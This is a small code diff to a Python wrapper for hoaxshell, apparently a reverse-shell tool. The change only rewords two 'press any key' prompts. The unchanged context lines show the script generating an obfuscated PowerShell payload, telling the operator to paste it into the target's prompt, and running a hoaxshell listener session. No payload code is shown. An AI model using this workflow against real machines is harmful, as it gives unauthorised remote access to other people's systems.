@@ -104,7 +104,7 @@ def main():
     print("Payload saved to /tmp/obfuscated.ps1 \nPayload printing below\n\n")
     os.system("cat /tmp/obfuscated.ps1")
     print("\n" + Fore.RED + "Copy payload to target powershell prompt" + Style.RESET_ALL)
-    input("\nPress any key to continue")
+    input("\nPress enter to continue")
     os.system("sudo tmux send-keys -t hoaxshell ENTER")
 
     #Hoaxshell tmux session
@@ -115,7 +115,7 @@ def main():
     #Clean up
     os.system("sudo rm /tmp/payload.ps1 /tmp/obfuscated.ps1")
     os.system("sudo tmux kill-session -t hoaxshell")
-    input("Press any key to exit")
+    input("Press enter to exit")
 
 
 
